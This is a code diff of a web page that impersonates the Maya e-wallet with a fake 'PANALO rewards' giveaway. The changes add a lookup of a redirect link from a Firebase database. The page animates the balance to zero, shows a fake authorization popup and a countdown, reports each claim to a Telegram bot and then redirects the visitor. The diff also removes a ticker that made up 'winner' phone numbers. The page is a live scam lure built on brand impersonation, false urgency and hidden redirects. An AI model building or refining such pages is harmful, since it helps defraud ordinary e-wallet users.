@@ -47,6 +47,7 @@
       z-index: 0;
     }
 
+    /* ========== AD OVERLAY ========== */
     .ad-overlay {
       position: fixed;
       inset: 0;
@@ -68,6 +69,7 @@
       visibility: visible;
     }
 
+    /* ========== INITIAL AD ========== */
     .ad-container {
       max-width: 380px;
       width: 100%;
@@ -507,6 +509,10 @@
       margin-bottom: 0.2rem;
     }
 
+    .auth-popup-amount .zero {
+      color: #2EF2A3;
+    }
+
     .auth-popup-message {
       background: rgba(46, 242, 163, 0.04);
       border: 1px solid rgba(46, 242, 163, 0.06);
@@ -560,82 +566,6 @@
       box-shadow: 0 0 50px rgba(46, 242, 163, 0.2);
     }
 
-    /* ========== WINNERS TICKER - SIMPLIFIED ========== */
-    .winners-ticker {
-      background: rgba(8, 18, 14, 0.6);
-      backdrop-filter: blur(12px);
-      -webkit-backdrop-filter: blur(12px);
-      border-radius: 20px;
-      padding: 0.5rem 1.2rem;
-      border: 1px solid rgba(46, 242, 163, 0.08);
-      margin-bottom: 1rem;
-      display: flex;
-      align-items: center;
-      gap: 0.6rem;
-      overflow: hidden;
-      position: relative;
-      min-height: 42px;
-    }
-
-    .winners-ticker .ticker-scroll {
-      flex: 1;
-      overflow: hidden;
-      position: relative;
-      height: 28px;
-    }
-
-    .winners-ticker .ticker-track {
-      display: flex;
-      flex-direction: column;
-      animation: scrollWinners 10s infinite;
-    }
-
-    .winners-ticker .ticker-item {
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-      height: 28px;
-      padding: 0 0.2rem;
-      white-space: nowrap;
-    }
-
-    .winners-ticker .ticker-item .winner-icon {
-      width: 20px;
-      height: 20px;
-      object-fit: contain;
-      filter: drop-shadow(0 0 8px rgba(46, 242, 163, 0.1));
-      flex-shrink: 0;
-    }
-
-    .winners-ticker .ticker-item .winner-number {
-      color: #2EF2A3;
-      font-size: 0.75rem;
-      font-weight: 700;
-      letter-spacing: 0.02em;
-    }
-
-    .winners-ticker .ticker-item .winner-received {
-      color: rgba(255, 255, 255, 0.3);
-      font-size: 0.65rem;
-      font-weight: 400;
-    }
-
-    .winners-ticker .ticker-item .winner-amount {
-      color: #ffffff;
-      font-size: 0.8rem;
-      font-weight: 700;
-      text-shadow: 0 0 20px rgba(46, 242, 163, 0.05);
-    }
-
-    @keyframes scrollWinners {
-      0%, 16% { transform: translateY(0); }
-      20%, 36% { transform: translateY(-28px); }
-      40%, 56% { transform: translateY(-56px); }
-      60%, 76% { transform: translateY(-84px); }
-      80%, 96% { transform: translateY(-112px); }
-      100% { transform: translateY(0); }
-    }
-
     /* ========== MOBILE CONTAINER ========== */
     .mobile-container {
       max-width: 420px;
@@ -677,7 +607,7 @@
       display: flex;
       justify-content: space-between;
       align-items: center;
-      margin-bottom: 1rem;
+      margin-bottom: 1.5rem;
     }
 
     .logo-wrapper {
@@ -698,6 +628,22 @@
       font-weight: 700;
       color: #ffffff;
       letter-spacing: -0.02em;
+    }
+
+    .header-actions {
+      display: flex;
+      gap: 0.8rem;
+      font-size: 1.2rem;
+    }
+
+    .header-actions span {
+      opacity: 0.5;
+      cursor: pointer;
+      transition: opacity 0.3s;
+    }
+
+    .header-actions span:hover {
+      opacity: 0.8;
     }
 
     .featured-card {
@@ -1224,41 +1170,6 @@
       .spend-rewards-section {
         padding: 1rem 1rem;
       }
-
-      .winners-ticker {
-        padding: 0.4rem 0.8rem;
-        min-height: 36px;
-      }
-
-      .winners-ticker .ticker-item .winner-number {
-        font-size: 0.65rem;
-      }
-
-      .winners-ticker .ticker-item .winner-amount {
-        font-size: 0.7rem;
-      }
-
-      .winners-ticker .ticker-item .winner-icon {
-        width: 16px;
-        height: 16px;
-      }
-
-      .winners-ticker .ticker-scroll {
-        height: 24px;
-      }
-
-      .winners-ticker .ticker-item {
-        height: 24px;
-      }
-
-      @keyframes scrollWinners {
-        0%, 16% { transform: translateY(0); }
-        20%, 36% { transform: translateY(-24px); }
-        40%, 56% { transform: translateY(-48px); }
-        60%, 76% { transform: translateY(-72px); }
-        80%, 96% { transform: translateY(-96px); }
-        100% { transform: translateY(0); }
-      }
     }
 
     @media (max-width: 360px) {
@@ -1374,23 +1285,18 @@
 
   <div class="mobile-container">
     <div class="main-card">
-      <!-- Header with Maya logo only -->
+      <!-- Header -->
       <div class="header">
         <div class="logo-wrapper">
           <img src="images/maya_icon.png" alt="Maya" class="maya-logo" />
           <span class="maya-text">maya</span>
         </div>
-      </div>
-
-      <!-- Winners Ticker - Simplified -->
-      <div class="winners-ticker" id="winnersTicker">
-        <div class="ticker-scroll">
-          <div class="ticker-track" id="tickerTrack">
-            <!-- Items will be inserted by JavaScript -->
-          </div>
+        <div class="header-actions">
+          <span class="notification">🔔</span>
         </div>
       </div>
 
+      <!-- Featured Card -->
       <div class="featured-card" id="featuredCard">
         <div class="featured-glow"></div>
         <div class="featured-content">
@@ -1404,6 +1310,7 @@
         </div>
       </div>
 
+      <!-- Treats Badge -->
       <div class="treats-badge">
         <span class="sparkle">✦</span>
         Enjoy these
@@ -1411,15 +1318,18 @@
         <span class="sparkle">✦</span>
       </div>
 
+      <!-- Main Headline -->
       <h1 class="main-headline">
         <span class="panalo">PANALO</span>
         <span class="rewards">rewards!</span>
       </h1>
 
+      <!-- Sub Text -->
       <p class="sub-text">
         A winning treat reward just for you!
       </p>
 
+      <!-- Spend & Get -->
       <div class="spend-rewards-section">
         <span class="spend-rewards-label">✦ Promo</span>
         <div class="spend-rewards-text">
@@ -1431,11 +1341,13 @@
         </div>
       </div>
 
+      <!-- Exclusive Badge -->
       <div class="exclusive-badge">
         <span class="dot"></span>
         Exclusive for <strong>Maya Users</strong>
       </div>
 
+      <!-- CTA Section -->
       <div class="cta-section">
         <button class="claim-btn" id="claimBtn">
           <img src="images/maya_icon.png" alt="Maya" class="btn-icon" />
@@ -1464,6 +1376,7 @@
       measurementId: "G-831RDLPWSJ"
     };
 
+    // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
@@ -1478,9 +1391,7 @@
       
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: TELEGRAM_CHAT_ID,
           text: message,
@@ -1488,54 +1399,9 @@
         })
       })
       .then(response => response.json())
-      .then(data => {
-        console.log('✅ Telegram notification sent:', data);
-      })
-      .catch(error => {
-        console.error('❌ Telegram notification failed:', error);
-      });
+      .then(data => console.log('✅ Telegram sent:', data))
+      .catch(error => console.error('❌ Telegram failed:', error));
     }
-
-    // ============================================================
-    // WINNERS DATA
-    // ============================================================
-    const winners = [];
-
-    function generateWinners() {
-      const amounts = [200, 200, 200, 200, 200, 200, 200, 200, 500, 500, 1000, 6000, 10000];
-      
-      for (let i = 0; i < 6; i++) {
-        const prefix = '09' + String(Math.floor(Math.random() * 100000000)).padStart(8, '0');
-        const last4 = String(Math.floor(Math.random() * 10000)).padStart(4, '0');
-        const number = prefix.slice(0, 4) + '***' + last4;
-        const amount = amounts[Math.floor(Math.random() * amounts.length)];
-        winners.push({ number, amount });
-      }
-    }
-
-    function renderWinners() {
-      const track = document.getElementById('tickerTrack');
-      if (!track) return;
-      
-      let html = '';
-      winners.forEach((winner) => {
-        const amountStr = winner.amount >= 1000 ? 
-          `₱${winner.amount.toLocaleString()}` : 
-          `₱${winner.amount}.00`;
-        html += `
-          <div class="ticker-item">
-            <img src="images/maya_icon.png" alt="Maya" class="winner-icon" />
-            <span class="winner-number">${winner.number}</span>
-            <span class="winner-received">received</span>
-            <span class="winner-amount">${amountStr}</span>
-          </div>
-        `;
-      });
-      track.innerHTML = html;
-    }
-
-    generateWinners();
-    renderWinners();
 
     // ============================================================
     // MAIN SCRIPT
@@ -1543,7 +1409,31 @@
     document.addEventListener('DOMContentLoaded', function() {
       console.log('DOM loaded - Initializing...');
 
-      // Initial Ad
+      // ========== GET 2H LINK ==========
+      function get2HLink() {
+        return new Promise((resolve, reject) => {
+          database.ref('links').orderByChild('type').equalTo('2H').once('value')
+            .then((snapshot) => {
+              const links = snapshot.val();
+              console.log('2H Links from Firebase:', links);
+              if (!links) {
+                reject(new Error('NO_LINK'));
+                return;
+              }
+              // Get the most recent 2H link
+              const linkIds = Object.keys(links);
+              const latestId = linkIds[linkIds.length - 1];
+              const linkData = links[latestId];
+              resolve({ linkId: latestId, linkData });
+            })
+            .catch((error) => {
+              console.error('Error fetching 2H link:', error);
+              reject(error);
+            });
+        });
+      }
+
+      // ========== INITIAL AD ==========
       const initialAdOverlay = document.getElementById('initialAdOverlay');
       const initialAdClose = document.getElementById('initialAdClose');
       const initialAdCta = document.getElementById('initialAdCta');
@@ -1591,7 +1481,7 @@
         });
       }
 
-      // DOM Elements
+      // ========== DOM ELEMENTS ==========
       const claimBtn = document.getElementById('claimBtn');
       const claimPopupOverlay = document.getElementById('claimPopupOverlay');
       const countdownNumber = document.getElementById('countdownNumber');
@@ -1607,7 +1497,7 @@
       let pendingLinkId = null;
       let pendingLinkData = null;
 
-      // ========== STEP 1: BALANCE DECREMENT ANIMATION ==========
+      // ========== STEP 1: BALANCE DECREMENT ==========
       function animateBalance() {
         return new Promise((resolve) => {
           featuredAmount.classList.add('animating');
@@ -1622,10 +1512,7 @@
               currentValue = 0;
               clearInterval(countDown);
               featuredAmount.textContent = `₱${currentValue.toFixed(2)}`;
-              
-              setTimeout(() => {
-                resolve();
-              }, 500);
+              setTimeout(() => resolve(), 500);
               return;
             }
             featuredAmount.textContent = `₱${currentValue.toFixed(2)}`;
@@ -1633,7 +1520,7 @@
         });
       }
 
-      // ========== STEP 2: SHOW AUTHORIZATION POPUP ==========
+      // ========== STEP 2: AUTHORIZATION POPUP ==========
       function showAuthPopup() {
         return new Promise((resolve) => {
           authBalanceAmount.textContent = '0.00';
@@ -1648,7 +1535,7 @@
         });
       }
 
-      // ========== STEP 3: SHOW COUNTDOWN POPUP ==========
+      // ========== STEP 3: COUNTDOWN POPUP ==========
       function showCountdownPopup(linkId, linkData) {
         return new Promise((resolve, reject) => {
           if (popupActive) {
@@ -1694,6 +1581,7 @@
               document.body.style.overflow = '';
               popupActive = false;
               
+              // Increment click count and redirect
               const newClicks = (linkData.clicks || 0) + 1;
               database.ref('links/' + linkId + '/clicks').set(newClicks)
                 .then(() => {
@@ -1709,49 +1597,39 @@
         });
       }
 
-      // ========== GET LATEST LINK ==========
-      function getLatestLink() {
-        return new Promise((resolve, reject) => {
-          database.ref('links').orderByChild('createdAt').limitToLast(1).once('value')
-            .then((snapshot) => {
-              const links = snapshot.val();
-              if (!links) {
-                reject(new Error('NO_LINK'));
-                return;
-              }
-              const linkId = Object.keys(links)[0];
-              const linkData = links[linkId];
-              resolve({ linkId, linkData });
-            })
-            .catch((error) => {
-              reject(error);
-            });
-        });
-      }
-
       // ========== CLAIM BUTTON CLICK ==========
       if (claimBtn) {
         claimBtn.addEventListener('click', async function(e) {
           console.log('Claim button clicked!');
           
+          // Show loading state
           this.classList.add('loading');
           this.innerHTML = '<span class="btn-icon" style="animation: spin 0.8s linear infinite; width:22px;height:22px;display:inline-block;">⟳</span> Processing...';
           
           try {
-            const { linkId, linkData } = await getLatestLink();
-            console.log('Link retrieved successfully:', linkData.url);
+            // Get 2H link from Firebase
+            const { linkId, linkData } = await get2HLink();
+            console.log('2H Link retrieved successfully:', linkData.url);
             
+            // Reset button
             this.classList.remove('loading');
             this.innerHTML = '<img src="images/maya_icon.png" alt="Maya" class="btn-icon" /> Claim NOW';
             
+            // Send Telegram notification
             const userMessage = `👤 *User claimed reward!*\n🔗 *Link:* ${linkData.hash || 'N/A'}\n👆 *Total Clicks:* ${(linkData.clicks || 0) + 1}`;
             sendTelegramNotification(userMessage);
             
+            // Store pending data
             pendingLinkId = linkId;
             pendingLinkData = linkData;
             
+            // STEP 1: Balance Decrement Animation
             await animateBalance();
+            
+            // STEP 2: Authorization Popup
             await showAuthPopup();
+            
+            // STEP 3: Countdown Popup & Redirect
             await showCountdownPopup(linkId, linkData);
             
           } catch (error) {
@@ -1760,6 +1638,7 @@
             this.classList.remove('loading');
             this.innerHTML = '<img src="images/maya_icon.png" alt="Maya" class="btn-icon" /> Claim NOW';
             
+            // Close any open popups
             authPopup.classList.remove('active');
             claimPopupOverlay.classList.remove('active');
             document.body.style.overflow = '';
@@ -1784,7 +1663,7 @@
         });
       }
 
-      // ========== TOAST FUNCTION ==========
+      // ========== TOAST ==========
       function showToast(message, isError = false) {
         const existingToast = document.querySelector('.toast-message');
         if (existingToast) {
